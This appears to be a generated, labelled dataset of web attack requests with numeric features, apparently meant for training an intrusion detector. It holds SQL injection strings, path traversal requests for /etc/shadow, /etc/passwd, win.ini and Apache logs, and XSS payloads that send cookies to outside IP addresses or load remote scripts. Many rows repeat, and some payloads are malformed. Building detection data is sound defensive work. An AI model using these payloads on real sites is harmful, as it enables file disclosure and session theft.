+75,2,200,1008,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,4231,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6653,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2991,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5270,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7766,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3709,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5504,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2621,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,3509,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6851,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,4934,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7088,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6610,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6589,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2706,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,1713,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,6866,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,4081,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,2890,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,4458,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7866,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,7378,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5856,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5129,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+75,2,200,5932,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
+78,1,200,1717,8,27,16,6,2,GET /?p=<script>%window.open('http://217.45.100.86/944457')3C/script> HTTP/1.1
+51,1,200,3984,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,5465,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,1083,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,3584,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,6004,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,3128,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,1621,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,3292,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,7457,8,24,9,3,2,GET /?file=<script>%alert("xss")3C/script> HTTP/1.1
+101,1,200,5093,7,54,19,6,2,GET /?file=<script>window.location='http://188.72.178.148/?cookie='+document.cookie</script> HTTP/1.1
+50,1,200,5822,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,3512,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,7005,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,1635,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,2442,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,4670,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,7728,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,6691,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,5310,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,6753,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,7965,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,5305,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,7606,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,1391,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,1450,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,4182,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,4241,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+50,1,200,6824,7,21,12,6,3,GET get-files?file=../../../../etc/shadow HTTP/1.1
+61,1,200,2414,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,1591,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,7561,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,3845,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,4908,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,5255,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,4992,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,6102,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,1632,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,4021,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,4289,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+61,1,200,2327,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
+51,1,200,1370,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,2105,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,1413,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,2952,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,6609,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,7219,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,3986,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,2736,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,2123,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,1693,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,1405,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,7460,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,7195,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,2481,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,6754,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,1240,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+51,1,200,4208,8,24,9,3,2,GET /?name=<script>%alert("xss")3C/script> HTTP/1.1
+60,1,200,1745,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,4842,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,6242,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,7819,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,7409,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,7262,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,7979,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,2959,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,1500,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,1005,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,3525,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,2439,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,1094,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,7297,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,6206,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,1098,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,3095,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+60,1,200,7971,7,29,13,7,3,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1
+85,1,200,2473,7,33,17,6,2,GET /?search=<script><script+src="http://212.195.102.32/589429.js=></script> HTTP/1.1
+57,1,200,4769,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,6235,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,5610,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,2221,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,4258,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,1383,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,6516,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,6596,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,3340,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,1092,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,4821,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,3086,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,1145,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,6558,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,6644,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+57,1,200,1119,7,21,17,1,3,GET get.php?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,1193,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,6580,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,6288,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,6439,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,4295,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,4412,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,3589,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,1485,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,3385,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,3032,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,2984,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,6075,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,7103,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,2233,7,28,13,7,3,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,1559,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,7438,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,4501,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,2014,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,1716,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,1885,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,4786,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,2980,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,6466,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,5432,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,2547,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,7633,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,3056,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,4357,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,2877,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,5146,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,5022,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,5813,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,1985,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,1078,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,7701,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+60,1,200,6749,7,29,13,7,3,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1
+59,1,200,5337,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,7382,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,1899,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,4534,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,1958,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,5897,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,7941,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,7668,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,2564,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,7471,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,2988,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,5092,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,1226,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,2710,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,5453,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+59,1,200,6935,7,23,17,1,3,GET get-files?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+80,1,200,7879,7,38,14,5,2,GET /?file=<script>window.location.href="http://75.153.91.255"</script> HTTP/1.1
+96,1,200,7779,7,51,19,6,2,GET /?p=<script>window.location='http://15.99.211.38/?cookie='+document.cookie</script> HTTP/1.1
+53,1,200,6117,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+53,1,200,1118,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+53,1,200,6724,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+53,1,200,3777,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+53,1,200,5645,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+53,1,200,6822,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+53,1,200,4365,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+53,1,200,3196,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+53,1,200,3327,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+53,1,200,1838,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+53,1,200,2006,8,26,9,3,2,GET /?search=<script>%alert("xss")3C/script> HTTP/1.1
+49,1,200,7550,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,2946,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,7591,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,1472,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,7075,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,2856,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,3090,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,2498,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,1768,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,2877,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,7558,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,5698,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,3685,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,3599,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,5290,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,5811,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+49,1,200,6233,7,20,12,6,3,GET main.cgi?file=../../../../etc/shadow HTTP/1.1
+77,1,200,6852,7,35,14,5,2,GET /?p=<script>window.location.href="http://150.14.243.36"</script> HTTP/1.1
+58,1,200,3774,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,6781,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,6112,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,7170,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,4630,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,5055,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,5326,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,1414,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,4969,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,7281,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,6877,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,6855,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,2727,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,2951,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,1660,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,2235,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,4369,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,5134,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+58,1,200,3153,7,22,17,1,3,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+84,1,200,4347,7,31,17,6,2,GET /?file=<script><script+src="http://243.180.151.213/778777.js=></script> HTTP/1.1
+62,1,200,3182,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,2136,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,1726,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,3700,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,6201,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,6998,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,7892,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,6838,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,1614,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,7597,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,1155,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,5795,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,5709,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+62,1,200,3048,7,31,13,7,3,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1
+84,1,200,5703,7,33,17,6,2,GET /?search=<script><script+src="http://17.126.191.14/217298.js=></script> HTTP/1.1
+46,1,200,4277,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
+46,1,200,3987,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
+46,1,200,6846,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
+46,1,200,7088,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
+46,1,200,5166,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
+46,1,200,5762,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
+46,1,200,1372,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
+46,1,200,6156,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
+46,1,200,1067,7,18,10,7,3,GET ../../../../apache/logs/error.log HTTP/1.1
+79,1,200,3181,7,38,14,5,2,GET /?file=<script>window.location.href="http://163.208.0.32"</script> HTTP/1.1
+81,1,200,2589,7,31,17,6,2,GET /?file=<script><script+src="http://3.42.212.197/622934.js=></script> HTTP/1.1
+48,1,200,1123,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+48,1,200,5496,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+48,1,200,2255,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+48,1,200,2352,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+48,1,200,2482,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+48,1,200,2505,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+48,1,200,1206,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+48,1,200,7429,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+48,1,200,4373,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+48,1,200,3032,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+48,1,200,3993,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
+35,1,200,6928,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+35,1,200,7542,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+35,1,200,1664,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+35,1,200,3012,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+35,1,200,5480,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+35,1,200,7116,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+35,1,200,5557,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+35,1,200,3608,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+35,1,200,6002,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+35,1,200,6665,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+35,1,200,5271,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
+83,1,200,2141,8,32,16,6,2,GET /?search=<script>%window.open('http://147.224.38.30/852122')3C/script> HTTP/1.1
+44,1,200,2899,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,4811,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,3259,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,7343,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,5557,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,5721,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,2848,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,4858,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,4584,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,6494,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,2684,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+44,1,200,7984,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
+49,1,200,2806,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
+49,1,200,3292,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
